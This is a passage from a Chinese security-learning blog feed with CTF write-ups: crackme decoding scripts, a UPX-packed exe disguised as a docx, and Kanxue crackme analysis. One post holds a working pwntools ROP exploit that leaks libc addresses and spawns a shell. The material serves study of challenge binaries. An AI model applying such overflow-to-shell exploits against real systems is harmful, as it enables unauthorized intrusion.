0x2f - 0x41</div><div class="line">    end = 0x7a - 0x41</div><div class="line">    ll = 0</div><div class="line">    for a1 in range(begin, end):</div><div class="line">        if ll == 1:</div><div class="line">            break;</div><div class="line">        for a2 in range(begin, end):</div><div class="line">            if ll == 1:</div><div class="line">                break;</div><div class="line">            for a3 in range(begin, end):</div><div class="line">                if ll == 1:</div><div class="line">                    break;</div><div class="line">                for a4 in range(begin, end):</div><div class="line">                    if (a1 * 4 + (a2 &amp; 0x30) / 16 == k1) and ((a3 &amp; 0x3c) / 4 + (a2 &amp; 0x0f) * 16 == k2) and (</div><div class="line">                                        ((a3 &amp; 0x03) * 2 ** 6) % 256 + a4 == k3):</div><div class="line">                        ll = 1</div><div class="line">                        k = int(hex(a1), 16)</div><div class="line">                        k=pandun(k)</div><div class="line">                        print chr(k)</div><div class="line">                        c1.append(chr(k))</div><div class="line">                        break;</div><div class="line">def pandun(x1):</div><div class="line">    if (x1&gt;=0)and(x1&lt;=0x19):</div><div class="line">        x1=int(x1)+0x41</div><div class="line">    elif (x1&gt;=0x1a)and(x1&lt;=0x33):</div><div class="line">        x1 = int(x1) + 0x47</div><div class="line">    elif (x1&gt;=0x34)and(x1&lt;=0x3d):</div><div class="line">        x1=int(x1)-0x4</div><div class="line">    else:</div><div class="line">        x1=int(x1)-0x13</div><div class="line">    return x1</div><div class="line">def test():</div><div class="line">    a1 = 0x2c</div><div class="line">    a2 = 0x30</div><div class="line">    a3 = 0x2c</div><div class="line">    a4 = 0</div><div class="line">    k = a1 * 4 + (a2 &amp; 0x30) / 16</div><div class="line">    print hex(k)</div><div class="line">    k = (a3 &amp; 0x3c) / 4 + (a2 &amp; 0x0f) * 16</div><div class="line">    print hex(k)</div><div class="line">    k = ((a3 &amp; 0x03) * 2 ** 6) % 256 + a4</div><div class="line">    print hex(k)</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    bp()</div></pre></td></tr></table></figure></p><p>这里我是od一步一步分析的，还是耐心不够<br>后来看师傅们的，发现都用爆破，这。。。。。(怪我代码能力弱了)<br>还有一个可以看反编译？这很奇怪（原来是有花指令，导致ida不能反编译成伪代码)<br>后来下来自己下来od手动去除伪代码（没有用的单字节去掉，不过伪代码有些东西类型，这只是一种）,可以f5后，也是要看大量的代码，佩服师傅们的能力，自己觉得od和ida结合是最好的<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1flahd5iz10j30hf0iuglv.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1flahdhlfxkj30iq0inwem.jpg" alt=""><br>这里也附上师傅们的wp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">import string</div><div class="line">import base64</div><div class="line">data = file(&apos;flag.enc&apos;).read().strip()</div><div class="line">data1 = &apos;&apos;</div><div class="line">for i in data:</div><div class="line">data1 += chr(ord(i)-0x10)</div><div class="line">data1 = data1.decode(&apos;hex&apos;)</div><div class="line">bd = base64.b64encode(data1)</div><div class="line">t1 = string.uppercase+string.lowercase+string.digits+r&apos;+/&apos;</div><div class="line">t2=&apos;&apos;</div><div class="line">for i in t1:</div><div class="line">t2 += chr(ord(i)-10)</div><div class="line">table1 = string.maketrans(t1,t2)</div><div class="line">table2 = string.maketrans(t2,t1)</div><div class="line">bd1 = bd.translate(table1)</div><div class="line">s=&apos;&apos;</div><div class="line">for i in range(len(bd1)/4):</div><div class="line">s += bd1[4*i]</div><div class="line">bd2 = s.translate(table2)</div><div class="line">n = 3-len(bd2)%3</div><div class="line">bd2 += &apos;=&apos;*n</div><div class="line">print base64.b64decode(bd2)</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;完全被打蒙&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PWN为了入群做题</title>
    <link href="http://yoursite.com/2017/11/03/pwn_ruqun/"/>
    <id>http://yoursite.com/2017/11/03/pwn_ruqun/</id>
    <published>2017-11-03T07:11:56.346Z</published>
    <updated>2017-11-09T11:41:20.593Z</updated>
    
    <content type="html"><![CDATA[<p>想学习，必要了解各位师傅，必入群<br><a id="more"></a></p><h2 id="1、入群"><a href="#1、入群" class="headerlink" title="1、入群"></a>1、入群</h2><p>链接：<a href="http://pan.baidu.com/s/1qY4wyoW" target="_blank" rel="external">http://pan.baidu.com/s/1qY4wyoW</a> 密码：46d4<br>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf=ELF(&apos;pwn&apos;)</div><div class="line">get_got = elf.got[&apos;fgets&apos;]</div><div class="line">puts_plt = elf.plt[&apos;puts&apos;]</div><div class="line">puts_got = elf.got[&apos;puts&apos;]</div><div class="line">main = elf.symbols[&apos;main&apos;]</div><div class="line"></div><div class="line">bss = 0x6020b0</div><div class="line">ppprdi=0x401ab0</div><div class="line">        </div><div class="line">p = process(&apos;pwn&apos;)</div><div class="line">p.recvuntil(&apos;&gt; &apos;)</div><div class="line">#gdb.attach(p,&apos;&apos;&apos;b *0x4019ea &apos;&apos;&apos;)</div><div class="line"></div><div class="line">def peek(addr):</div><div class="line">    rop = p64(ppprdi) +p64(addr) +p64(1)+p64(1) + p64(puts_plt) + p64(main)</div><div class="line">    p.sendline(&apos;A&apos;*40+ rop)</div><div class="line">    str = p.recvuntil(&apos;&gt; &apos;)</div><div class="line">    result = str.split(&apos;\ncallme&apos;)[0]</div><div class="line">    if result == &apos;&apos;:</div><div class="line">        return &apos;\x00&apos;</div><div class="line">    return result</div><div class="line"></div><div class="line">d = DynELF(peek, elf=elf)</div><div class="line">system = int(d.lookup(&apos;system&apos;, &apos;libc&apos;))</div><div class="line">gets = int(d.lookup(&apos;gets&apos;, &apos;libc&apos;))</div><div class="line"></div><div class="line"></div><div class="line">rop = p64(ppprdi) + p64(bss) +p64(1)+p64(1) + p64(gets) + p64(main)</div><div class="line">payload = &quot;A&quot;*40 + rop</div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(&apos;/bin/sh\0&apos;)</div><div class="line">p.recvuntil(&apos;&gt; &apos;)</div><div class="line"></div><div class="line">rop=p64(ppprdi) + p64(bss) +p64(1)+p64(1) + p64(system) + p64(0xdeadbeef)</div><div class="line">payload = &quot;A&quot;*40+ rop</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>之后是什么、、、、说好的flag呢？<br>哇还有东西，居然还有都行，居然是.dat文件</p><p>害怕-恐怖</p><p>才想到做题技术大牛说的，不要害怕新的挑战，敢于尝试，</p><p>然后，研究几分钟，发现就很简单算法</p><h2 id="这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心"><a href="#这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心" class="headerlink" title="这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心"></a>这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心</h2><p>Do_more_and_ask_less</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;想学习，必要了解各位师傅，必入群&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE_病毒分析</title>
    <link href="http://yoursite.com/2017/11/01/re_doxc_exe/"/>
    <id>http://yoursite.com/2017/11/01/re_doxc_exe/</id>
    <published>2017-11-01T11:13:34.063Z</published>
    <updated>2017-11-09T11:52:23.643Z</updated>
    
    <content type="html"><![CDATA[<p>EXE文件伪装成docx，初次见到蒙<br><a id="more"></a></p><h2 id="1、题目"><a href="#1、题目" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1qX8PHnA" target="_blank" rel="external">http://pan.baidu.com/s/1qX8PHnA</a> 密码：34yi</p><h2 id="2、查看文件"><a href="#2、查看文件" class="headerlink" title="2、查看文件"></a>2、查看文件</h2><p>ida打开exe<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fl2t3vhhjkj30mp0azaam.jpg" alt=""><br>发现加壳程序,pedi没有检查倒是什么壳，放到kali用strings一下<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fl2t8nqbo8j30ed04g3yn.jpg" alt=""><br>尝试upx脱壳机脱，然而脱不下来,手动脱了,UPX的脱壳比较简单，找到pushad 和popad下断点，然后往下跟就好，找到的OEP<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fl2td2kzkpj31020ejq3s.jpg" alt=""><br>OEP开始一般都这样的<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fl2t5f8sq7j30x30d2gos.jpg" alt=""><br>右键使用OllyDump将程序dump出来即可，UPX加壳的程序不需要修复IAT就可以直接运行<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fl2tppwexjj30ye0gkta3.jpg" alt=""><br>用ida打开,已经可以看见代码啦<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fl2twn4r0jj30ym0fqgn1.jpg" alt=""><br>sub_401370函数的逻辑如下，主要行为为拷贝evil.exe到%temp%下一份，在从资源中释放evil.docx文件到当前目录</p><p>sub_401620的功能很简单，就是如果命令行参数个数为2（即之前新创建的进程），则循环删除evil.exe文件<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fl2u19e10nj30an08pa9x.jpg" alt=""><br>创建一个进程evil.exe “evil.exe”，然后打开docx<br>sub_4018F0从<a href="http://www.ddctf.com/x.jpg中读取数据。x.jpg即题目中的x.jpg，自建服务器然后将x.jpg放在" target="_blank" rel="external">http://www.ddctf.com/x.jpg中读取数据。x.jpg即题目中的x.jpg，自建服务器然后将x.jpg放在</a><br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fl2u4b81agj30mx0e9jrh.jpg" alt=""><br>之后是两个解码函数，这里可以直接忽略其中的逻辑。<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fl2u5spu00j30lc08st8o.jpg" alt=""><br>然后是执行sub_401220的函数,OD动态跟一下看<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fl2umxfvz1j30gc0a13yf.jpg" alt=""></p><h2 id="3、搭建环境"><a href="#3、搭建环境" class="headerlink" title="3、搭建环境"></a>3、搭建环境</h2><p>我们用IIS在本地搭建web服务，使得程序能访问 <a href="http://www.ddctf.com/x.jpg。" target="_blank" rel="external">http://www.ddctf.com/x.jpg。</a></p><h2 id="3、OD动态"><a href="#3、OD动态" class="headerlink" title="3、OD动态"></a>3、OD动态</h2><p>0x402476（main）<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fl2wae1m51j30oz0izn1i.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;EXE文件伪装成docx，初次见到蒙&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE——看雪</title>
    <link href="http://yoursite.com/2017/10/31/re_kx2/"/>
    <id>http://yoursite.com/2017/10/31/re_kx2/</id>
    <published>2017-10-31T03:00:27.411Z</published>
    <updated>2017-11-10T01:20:12.561Z</updated>
    
    <content type="html"><![CDATA[<p>去膜拜看雪师傅啦<br><a id="more"></a></p><h2 id="1、题目"><a href="#1、题目" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1kUYItoz" target="_blank" rel="external">http://pan.baidu.com/s/1kUYItoz</a> 密码：xem0<br>第三题，我感觉世界观坍塌啦。依然不会，还是学习为主。看大神们的记录，学习一遍</p><h2 id="3、分析"><a href="#3、分析" class="headerlink" title="3、分析"></a>3、分析</h2><p>一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，诸多反调试<br>二、入坑：<br>OD加载（好像我的od直接过了反调试），f9，运行，什么鬼，直接跳到了dll,继续f9….终于出现对话框，输入<br>12345678，结果程序崩溃。</p><p>IDA打开，定位到CrackMe字符串，找到关键函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line">int __stdcall sub_434EF0(HWND hDlg, int a2, int a3, int a4)</div><div class="line">&#123;</div><div class="line">  int v4; // ST0C_4@17</div><div class="line">  CHAR *v5; // esi@17</div><div class="line">  int v6; // eax@17</div><div class="line">  int v8; // [sp+0h] [bp-1A4Ch]@18</div><div class="line">  int v9; // [sp+4h] [bp-1A48h]@18</div><div class="line">  int v10; // [sp+8h] [bp-1A44h]@18</div><div class="line">  int v11; // [sp+Ch] [bp-1A40h]@1</div><div class="line">  int i; // [sp+1C4h] [bp-1888h]@14</div><div class="line">  char v13[1032]; // [sp+1D0h] [bp-187Ch]@16</div><div class="line">  char v14[40]; // [sp+5D8h] [bp-1474h]@14</div><div class="line">  int v15; // [sp+600h] [bp-144Ch]@14</div><div class="line">  char v16; // [sp+60Ch] [bp-1440h]@14</div><div class="line">  char v17; // [sp+60Dh] [bp-143Fh]@14</div><div class="line">  char v18; // [sp+A14h] [bp-1038h]@14</div><div class="line">  char v19; // [sp+A15h] [bp-1037h]@14</div><div class="line">  char v20; // [sp+E1Ch] [bp-C30h]@14</div><div class="line">  char v21; // [sp+E1Dh] [bp-C2Fh]@14</div><div class="line">  CHAR String; // [sp+1224h] [bp-828h]@14</div><div class="line">  char v23; // [sp+1225h] [bp-827h]@14</div><div class="line">  int v24; // [sp+162Ch] [bp-420h]@14</div><div class="line">  char v25; // [sp+1638h] [bp-414h]@1</div><div class="line">  char v26; // [sp+1639h] [bp-413h]@1</div><div class="line">  int v27; // [sp+1A40h] [bp-Ch]@1</div><div class="line">  unsigned int v28; // [sp+1A48h] [bp-4h]@1</div><div class="line">  int savedregs; // [sp+1A4Ch] [bp+0h]@1</div><div class="line"></div><div class="line">  memset(&amp;v11, 0xCCu, 0x1A40u);</div><div class="line">  v28 = (unsigned int)&amp;savedregs ^ dword_49B344;</div><div class="line">  v27 = 0;</div><div class="line">  v25 = 0;</div><div class="line">  sub_42D5E6(&amp;v26, 0, 1023);</div><div class="line">  v11 = a2;</div><div class="line">  if ( a2 == 16 )</div><div class="line">    ExitProcess(0);</div><div class="line">  if ( v11 == 272 )</div><div class="line">  &#123;</div><div class="line">    v27 = sub_42D4F1();</div><div class="line">    if ( v27 == 1 )</div><div class="line">      ExitProcess(0);</div><div class="line">    v27 = 0;</div><div class="line">    v27 = sub_42E428();</div><div class="line">    if ( v27 == 1 )</div><div class="line">      ExitProcess(0);</div><div class="line">    v27 = 0;</div><div class="line">    v27 = sub_42D825();</div><div class="line">    if ( v27 == 1 )</div><div class="line">      ExitProcess(0);</div><div class="line">    sub_42D14F(hDlg, 1);</div><div class="line">  &#125;</div><div class="line">  else if ( v11 == 273 )</div><div class="line">  &#123;</div><div class="line">    v11 = (unsigned __int16)a3;</div><div class="line">    if ( (unsigned __int16)a3 == 1002 )</div><div class="line">    &#123;</div><div class="line">      String = 0;</div><div class="line">      sub_42D5E6(&amp;v23, 0, 1023);</div><div class="line">      v20 = 0;</div><div class="line">      sub_42D5E6(&amp;v21, 0, 1023);</div><div class="line">      GetDlgItemTextA(hDlg, 1001, &amp;String, 1025);</div><div class="line">      v24 = sub_42DE51();</div><div class="line">      v18 = 0;</div><div class="line">      sub_42D5E6(&amp;v19, 0, 1023);</div><div class="line">      sub_42D267(&amp;String, 1024, &amp;v20);</div><div class="line">      v16 = 0;</div><div class="line">      sub_42D5E6(&amp;v17, 0, 1023);</div><div class="line">      sub_42D267(&amp;v20, 1024, &amp;v18);</div><div class="line">      sub_42D96A(&amp;v18, &amp;v16, 1024);</div><div class="line">      v15 = 3;</div><div class="line">      sub_42DA78(&amp;v18, 3, v14);</div><div class="line">      for ( i = 0; i &lt; 32; ++i )</div><div class="line">        sub_42DF05(&amp;v13[2 * i], &quot;%02x&quot;, v14[i]);</div><div class="line">      v4 = sub_42D794(v13);</div><div class="line">      v5 = &amp;String + sub_42D794(&amp;String);</div><div class="line">      v6 = sub_42D794(v13);</div><div class="line">      if ( !sub_42DB27(v13, &amp;v5[-v6], v4) )</div><div class="line">      &#123;</div><div class="line">        sub_42D0B4(v8, v9, v10);</div><div class="line">        if ( (unsigned __int8)sub_42D9AB(&amp;unk_49B000, &amp;v16) == 1 )</div><div class="line">        &#123;</div><div class="line">          MessageBoxA(0, &quot;ok&quot;, &quot;CrackMe&quot;, 0);</div><div class="line">          sub_42DE51();</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  sub_42D65E(&amp;savedregs, &amp;dword_435250);</div><div class="line">  sub_42D1E5();</div><div class="line">  return sub_42DE51();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>哇，还是经验太少，这里许多函数看不懂。</p><p>再用OD打开，发现程序有随机化，好烦，f9…出现对话框，按道理这时候可以在读取字符的API下断点，这里是GetDlgItemTextA。然而，我在当前模块中没有找到，后来发现个插件-设置API断点，总算断下来啦。接下来分析算法啦(这是我的能力还是太弱了)。</p><p>借助大神们的wp<br>IDA反汇编关键函数<br><img src="http://ww4.sinaimg.cn/large/006rgqhqly1fl19dym9r5j30xg0jvn5i.jpg" alt=""></p><p>这个直接明文:<br><img src="http://ww2.sinaimg.cn/large/006rgqhqly1fl19irbza0j30xq0cjtef.jpg" alt=""><br>我自己尝试，然而，我来到这个函数，程序执行后就崩溃了<br><img src="http://ww3.sinaimg.cn/large/006rgqhqly1fl19m8qbthj31180ho41f.jpg" alt=""><br>继续分析。</p><p>猜测作者意图<br>1、获取输入 ipt<br>2、两次 base64 解码得到 buf<br>3、自定义解码得到 cmd<br>4、判断 sm3(buf[:3) == ipt[-64:]<br>5、cmd 能在迷宫走到终点</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去膜拜看雪师傅啦&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE——初上看雪</title>
    <link href="http://yoursite.com/2017/10/28/re_kx1/"/>
    <id>http://yoursite.com/2017/10/28/re_kx1/</id>
    <published>2017-10-28T06:57:57.934Z</published>
    <updated>2017-11-09T11:53:40.036Z</updated>
    
    <content type="html"><![CDATA[<p>去膜拜看雪师傅啦<br><a id="more"></a></p><h2 id="1、看雪论坛"><a href="#1、看雪论坛" class="headerlink" title="1、看雪论坛"></a>1、看雪论坛</h2><p>看雪论坛是个软件安全技术交流场所，为安全技术爱好者提供一个技术交流平台和资源。从单一版块『软件调试论坛』，发展到以软件安全技术为主题多个版块的综合论坛。其实这是一个超级大神级别的存在，来膜拜一波</p><h2 id="2、题目"><a href="#2、题目" class="headerlink" title="2、题目"></a>2、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1qXVQmok" target="_blank" rel="external">http://pan.baidu.com/s/1qXVQmok</a> 密码：h5sw<br>去年你已经知道看雪啦，只是不敢去做题，自己太菜了，今年去试一试，第一道题签到题，很开心。然而，第二题，我已经跪啦，不过，在公布wp后，还是学到了许多，这里记录一下学习到的知识。</p><h2 id="3、分析"><a href="#3、分析" class="headerlink" title="3、分析"></a>3、分析</h2><p>一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，有明确提示成功和失败信息。<br>二、入坑：OD加载，查找字符，定位到：“You get it!”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">地址       反汇编                                    文本字符串</div><div class="line">00401000  /$  68 6CB04100   PUSH ctf2017_.0041B06C                   ;  \n Crackme for CTF2017 @Pediy.\n</div><div class="line">00401005  |.  E8 382D0100   CALL ctf2017_.00413D42</div><div class="line">0040100A  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040100D  |.  C705 34B04100&gt;MOV DWORD PTR DS:[0x41B034],0x2          ;  2</div><div class="line">00401017  |.  E8 34000000   CALL ctf2017_.00401050                   ;  input</div><div class="line">0040101C  |.  E8 6F000000   CALL ctf2017_.00401090                   ;  check1</div><div class="line">00401021  |.  E8 BA000000   CALL ctf2017_.004010E0                   ;  check2</div><div class="line">00401026  |.  A1 34B04100   MOV EAX,DWORD PTR DS:[0x41B034]          ;  0</div><div class="line">0040102B  |.  85C0          TEST EAX,EAX</div><div class="line">0040102D  |.  75 10         JNZ Xctf2017_.0040103F</div><div class="line">0040102F  |.  68 5CB04100   PUSH ctf2017_.0041B05C                   ;  You get it!\n</div><div class="line">00401034  |.  E8 092D0100   CALL ctf2017_.00413D42</div><div class="line">00401039  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040103C  |.  33C0          XOR EAX,EAX</div><div class="line">0040103E  |.  C3            RETN</div><div class="line">0040103F  |&gt;  68 38B04100   PUSH ctf2017_.0041B038                   ;  Bad register-code, keep trying.\n</div><div class="line">00401044  |.  E8 F92C0100   CALL ctf2017_.00413D42</div><div class="line">00401049  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040104C  |.  33C0          XOR EAX,EAX</div><div class="line">0040104E  \.  C3            RETN</div><div class="line">0040104F      90            NOP</div><div class="line">00401050  /$  83EC 0C       SUB ESP,0xC</div><div class="line">00401053  |.  68 ACB04100   PUSH ctf2017_.0041B0AC                   ;   Coded by Fpc.\n\n</div><div class="line">00401058  |.  E8 E52C0100   CALL ctf2017_.00413D42</div><div class="line">0040105D  |.  83C4 04       ADD ESP,0x4</div><div class="line">00401060  |.  68 90B04100   PUSH ctf2017_.0041B090                   ;   Please input your code:</div><div class="line">00401065  |.  E8 D82C0100   CALL ctf2017_.00413D42</div><div class="line">0040106A  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040106D  |.  8D4424 00     LEA EAX,DWORD PTR SS:[ESP]</div><div class="line">00401071  |.  50            PUSH EAX</div><div class="line">00401072  |.  68 8CB04100   PUSH ctf2017_.0041B08C                   ;  %s</div><div class="line">00401077  |.  E8 F72C0100   CALL ctf2017_.00413D73</div><div class="line">0040107C  |.  8D4424 08     LEA EAX,DWORD PTR SS:[ESP+0x8]</div><div class="line">00401080  |.  83C4 14       ADD ESP,0x14</div><div class="line">00401083  \.  C3            RETN</div></pre></td></tr></table></figure></p><p>简单跟踪几步发现 401090、4010E0 为显性算法比较，分析 401090、4010E0：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">void check1()</div><div class="line">&#123;</div><div class="line">  int v0; // [sp+4h] [bp-8h]@0</div><div class="line">  int v1; // [sp+8h] [bp-4h]@0</div><div class="line"></div><div class="line">  if ( v1 &amp;&amp; v0 &amp;&amp; v1 != v0 &amp;&amp; 5 * (v1 - v0) + v1 == 0x8F503A42 &amp;&amp; 13 * (v1 - v0) + v0 == 0xEF503A42 )</div><div class="line">    --dword_41B034;</div><div class="line">&#125;</div><div class="line">void check2()</div><div class="line">&#123;</div><div class="line">  int v0; // [sp+4h] [bp-8h]@0</div><div class="line">  int v1; // [sp+8h] [bp-4h]@0</div><div class="line"></div><div class="line">  if ( v1 &amp;&amp; v0 &amp;&amp; v1 != v0 &amp;&amp; 17 * (v1 - v0) + v1 == 0xF3A94883 &amp;&amp; 7 * (v1 - v0) + v0 == 0x33A94883 )</div><div class="line">    --dword_41B034;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p> 把输入每4个字符ASCII作为十六进制赋值计算，假设为a,b则：<br> ⑴：0x5 <em> ( a - b ) + a == 0x8F503A42<br> ⑵：0xD </em> ( a - b ) + b == 0xEF503A42<br> ⑶：0x11 <em> ( a - b ) + a == 0xF3A94883<br> ⑷：0x7 </em> ( a - b ) + b == 0x33A94883<br>然而我分析到这里，感觉只能穷举。。。。结果当然失败了<br>后来看了大佬们的wp，果然学到了许多<br>大佬1：考虑该显性算法未随机打乱数值，低位特征依然继承到计算结果，因此先尝试求解低位，再逐个往高位求解，避免穷举范围过大：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">def solve_false():</div><div class="line">    start_time = time.clock()</div><div class="line">    for a1 in range(0x30,0x7b):</div><div class="line">        for b1 in range(0x30,0x7b):</div><div class="line">            if (0x5 * (a1 - b1) + a1) &amp; 0xff == 0x42:</div><div class="line">                if (0xd * (a1 - b1) + b1) &amp; 0xff == 0x42:</div><div class="line">                    if (0x11 *(a1 - b1) + a1) &amp; 0xff == 0x83:</div><div class="line">                        if (0x7 * (a1 - b1) + b1) &amp; 0xff == 0x83:</div><div class="line">                            print (&quot;found sn a1 : %x&quot; % a1)</div><div class="line">                            print (&quot;found sn b1 : %x&quot; % b1)</div><div class="line">    print (&apos;use time: %.3f second&apos; % (time.clock()-start_time))</div><div class="line">    return</div></pre></td></tr></table></figure></p><p>迅速识别该方程组无合法答案，无疑是作者埋的坑，立即寻找其他途径。<br>大佬2:z3识别改方程组无解（这里我还是没有懂，z3太强大啦）<br>大佬3：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0x11 * ( a - b ) + a == 0xF3A94883</div><div class="line">0x5 * ( a - b ) + a == 0x8F503A42</div></pre></td></tr></table></figure></p><p>推出:<br><code>12 * ( a - b ) == 0x64590d41</code><br>右边为偶数，左边为奇数，无解</p><p>这道题由于没有判断输入长度，便存在溢出（这里我完全没有想打RE，还有溢出，涨知识了），那溢出到哪里呢？,大佬们发现0x00413131存在shellcode编码（膜拜），溢出到这里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div 